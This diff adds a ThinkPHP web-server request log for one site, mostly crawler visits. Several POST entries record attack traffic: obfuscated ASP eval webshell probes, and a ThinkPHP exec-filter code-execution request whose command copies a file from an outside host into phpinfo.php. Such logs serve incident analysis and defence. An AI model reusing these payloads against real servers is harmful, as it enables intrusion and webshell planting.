@@ -1,0 +1,2820 @@
+---------------------------------------------------------------
+[ 2020-05-04T00:11:11+08:00 ] 220.248.46.65 POST fw366.cn//api/dz/.svn/text-base/fe4s.aspx
+[运行时间：0.042955s] [吞吐率：23.28req/s] [内存消耗：2,474.94kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003141s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003168s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'dz',
+    2 => '.svn',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '816',
+  'x-forwarded-for' => '220.248.46.65',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '220.248.46.65',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  0 => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+  'base' => 'fe4s.aspx',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002021s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T00:11:11+08:00 ] 202.118.127.57 POST fw366.cn//api/dz/.svn/text-base/fe4s.aspx
+[运行时间：0.042483s] [吞吐率：23.54req/s] [内存消耗：2,474.81kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003193s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003222s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'dz',
+    2 => '.svn',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '681',
+  'x-forwarded-for' => '202.118.127.57',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '202.118.127.57',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  0 => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+  'base' => 'fe4s.aspx',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002044s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T00:25:32+08:00 ] 123.126.113.100 GET www.fw366.cn/
+[运行时间：0.048841s] [吞吐率：20.47req/s] [内存消耗：2,931.20kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003135s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003162s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',
+  'accept-encoding' => 'gzip,deflate',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002047s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T00:31:42+08:00 ] 157.55.39.166 GET www.fw366.cn/
+[运行时间：0.048023s] [吞吐率：20.82req/s] [内存消耗：2,933.30kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003170s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003198s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'host' => 'www.fw366.cn',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'Keep-Alive',
+  'cache-control' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002027s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T00:50:07+08:00 ] 123.49.195.172 POST fw366.cn//api/dz/egjcq86682.asp
+[运行时间：0.042557s] [吞吐率：23.50req/s] [内存消耗：2,474.55kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000041s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003147s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003185s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'dz',
+    2 => 'egjcq86682.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '835',
+  'x-forwarded-for' => '123.49.195.172',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '123.49.195.172',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'CJ_HOBUY_2_NDAMMODEL' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002019s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T00:50:07+08:00 ] 116.249.143.144 POST fw366.cn//api/dz/egjcq86682.asp
+[运行时间：0.042602s] [吞吐率：23.47req/s] [内存消耗：2,474.42kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000026s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003185s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003212s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'api',
+    1 => 'dz',
+    2 => 'egjcq86682.asp',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'content-length' => '700',
+  'x-forwarded-for' => '116.249.143.144',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '116.249.143.144',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'CJ_HOBUY_2_NDAMMODEL' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002048s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T02:46:29+08:00 ] 61.155.157.2 GET www.fw366.cn/
+[运行时间：0.048848s] [吞吐率：20.47req/s] [内存消耗：2,931.43kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003242s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003270s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002109s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T02:59:14+08:00 ] 117.69.241.174 POST fw366.cn/index.php
+[运行时间：0.048469s] [吞吐率：20.63req/s] [内存消耗：2,934.18kb] [文件加载：124]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000029s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003191s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003218s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '161',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
+  'host' => 'fw366.cn',
+)
+[ info ] [ PARAM ] array (
+  's' => 'echo "<?php echo copy("http://jz13888.com/pdb/doc/html/_images/js.css","phpinfo.php");echo "Gif89a" ?>" >>phpinfo.php',
+  'method' => '',
+  'filter' => 
+  array (
+    0 => 'exec',
+  ),
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002076s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/index/lang/zh-cn/index.php
+[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/fw366.cn/application/index/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/index/index.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T03:22:33+08:00 ] 54.36.150.82 GET www.fw366.cn/qianyue/97.html
+[运行时间：0.039829s] [吞吐率：25.11req/s] [内存消耗：2,273.29kb] [文件加载：113]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003182s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003209s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'qianyue',
+    1 => '97',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T03:38:32+08:00 ] 211.152.82.217 POST www.fw366.cn//API/Get_Rsume_Ajax.aspx
+[运行时间：0.042917s] [吞吐率：23.30req/s] [内存消耗：2,474.56kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000030s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003166s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003194s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'Get_Rsume_Ajax.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '211.152.82.217',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '211.152.82.217',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002025s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T03:38:32+08:00 ] 220.159.242.73 POST www.fw366.cn//API/Get_Rsume_Ajax.aspx
+[运行时间：0.042066s] [吞吐率：23.77req/s] [内存消耗：2,474.44kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003133s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003160s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'Get_Rsume_Ajax.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '220.159.242.73',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '220.159.242.73',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'abcd' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002004s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T03:44:24+08:00 ] 144.76.120.197 GET fw366.cn/index/user/login.html
+[运行时间：0.049589s] [吞吐率：20.17req/s] [内存消耗：2,959.47kb] [文件加载：121]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003210s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003237s ]
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'fw366.cn',
+  'accept-language' => 'zh',
+  'accept-encoding' => 'br,gzip',
+  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
+  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002049s ]
+[ info ] [ RUN ] app\index\controller\User->login[ /www/wwwroot/fw366.cn/application/index/controller/User.php ]
+[ info ] [ VIEW ] /www/wwwroot/fw366.cn/public/../application/index/view/user/login.html [ array (
+  0 => 'user',
+  1 => 'site',
+  2 => 'config',
+  3 => 'url',
+  4 => 'title',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T05:09:46+08:00 ] 54.36.149.72 GET www.fw366.cn/qianyue/128.html
+[运行时间：0.040179s] [吞吐率：24.89req/s] [内存消耗：2,273.30kb] [文件加载：113]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003157s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003184s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'qianyue',
+    1 => '128',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'deflate, gzip, br',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)',
+  'host' => 'www.fw366.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T05:49:54+08:00 ] 211.71.86.187 POST www.fw366.cn//API/handui.aspx
+[运行时间：0.043019s] [吞吐率：23.25req/s] [内存消耗：2,474.47kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003326s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003365s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '819',
+  'x-forwarded-for' => '211.71.86.187',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '211.71.86.187',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'xise' => 'Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i+2,2)&"""")""""):i=i+2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""526573706F6E73652E577269746528224C584C2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002137s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2020-05-04T05:49:54+08:00 ] 118.213.242.186 POST www.fw366.cn//API/handui.aspx
+[运行时间：0.042065s] [吞吐率：23.77req/s] [内存消耗：2,474.34kb] [文件加载：120]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.003134s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.003161s ]
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'API',
+    1 => 'handui.aspx',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.fw366.cn',
+  'content-length' => '684',
+  'x-forwarded-for' => '118.213.242.186',
+  'user-agent' => 'Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)',
+  'referer' => 'http://misc.yahoo.com.cn/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded; Charset=UTF-8',
+  'via' => '118.213.242.186',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
